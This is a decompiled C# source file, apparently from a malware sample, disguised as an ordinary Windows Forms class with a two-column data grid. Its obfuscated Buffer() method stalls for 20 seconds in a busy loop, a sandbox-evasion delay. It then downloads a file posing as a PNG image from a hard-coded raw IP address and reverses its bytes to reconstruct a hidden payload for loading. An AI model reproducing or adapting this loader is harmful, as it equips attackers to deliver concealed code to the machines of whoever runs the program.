using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;

namespace Qhvqj;

public class Form2 : Form
{
	private IContainer components = null;

	private DataGridView dataGridView1;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	public Form2()
	{
		InitializeComponent();
	}

	private byte[] Qkvbvzvcshyy(string url)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		return new WebClient().DownloadData(new Uri(url));
	}

	internal byte[] Buffer()
	{
		DateTime dateTime = DateTime.Now.AddSeconds(20.0);
		if (dateTime > DateTime.Now)
		{
			while (dateTime > DateTime.Now)
			{
			}
		}
		byte[] array = Qkvbvzvcshyy("http://91.243.44.142/arx-Axmvrxx_Inlvlxco.png");
		List<byte> list = new List<byte>();
		int num = array.Length;
		while (num-- > 0)
		{
			list.Add(array[num]);
		}
		return list.ToArray();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		dataGridView1 = new DataGridView();
		Column1 = new DataGridViewTextBoxColumn();
		Column2 = new DataGridViewTextBoxColumn();
		((ISupportInitialize)dataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		dataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		dataGridView1.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[2]
		{
			(DataGridViewColumn)Column1,
			(DataGridViewColumn)Column2
		});
		((Control)dataGridView1).set_Dock((DockStyle)5);
		((Control)dataGridView1).set_Location(new Point(0, 0));
		((Control)dataGridView1).set_Name("dataGridView1");
		dataGridView1.set_RowHeadersWidth(72);
		dataGridView1.get_RowTemplate().set_Height(31);
		((Control)dataGridView1).set_Size(new Size(653, 327));
		((Control)dataGridView1).set_TabIndex(1);
		((DataGridViewColumn)Column1).set_HeaderText("Column1");
		((DataGridViewColumn)Column1).set_MinimumWidth(9);
		((DataGridViewColumn)Column1).set_Name("Column1");
		((DataGridViewBand)Column1).set_ReadOnly(true);
		((DataGridViewColumn)Column1).set_Width(175);
		((DataGridViewColumn)Column2).set_HeaderText("Column2");
		((DataGridViewColumn)Column2).set_MinimumWidth(9);
		((DataGridViewColumn)Column2).set_Name("Column2");
		((DataGridViewBand)Column2).set_ReadOnly(true);
		((DataGridViewColumn)Column2).set_Width(175);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(653, 327));
		((Control)this).get_Controls().Add((Control)(object)dataGridView1);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((ISupportInitialize)dataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
